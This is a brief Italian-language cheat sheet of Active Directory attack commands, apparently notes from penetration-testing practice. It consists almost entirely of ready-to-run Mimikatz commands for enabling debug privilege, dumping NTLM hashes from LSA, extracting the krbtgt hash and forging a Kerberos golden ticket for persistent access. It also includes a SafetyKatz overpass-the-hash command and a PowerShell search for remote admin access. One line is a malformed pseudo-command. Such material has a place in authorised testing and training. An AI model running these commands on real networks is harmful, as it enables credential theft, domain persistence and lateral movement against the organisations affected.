### **ASSICURATI CHE STIA RUNNANDO COME PRIVILEGED**
```powershell
privilege::debug
```
### **DUMPA LE NTLM HASH**
```powershell
lsadump::lsa /patch
```
![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png)
### **GOLDEN TICKET**
Crei un ticket per poter loggare quando vuoi
```MSF
golden_ticket_create //MSF
```
```MSF
lsadump::lsa /inject /name:krbtgt
```
per creare il golden ticket
```MSF
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```

### **OVERPASS THE HASH**
*Using SafetyKatz*
```powershell
.\SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /run:cmd.exe" "exit"
```
Run invishell and look for other system access
```powershell
Find-PSRemotingLocalAdminAccess -Verbose
```
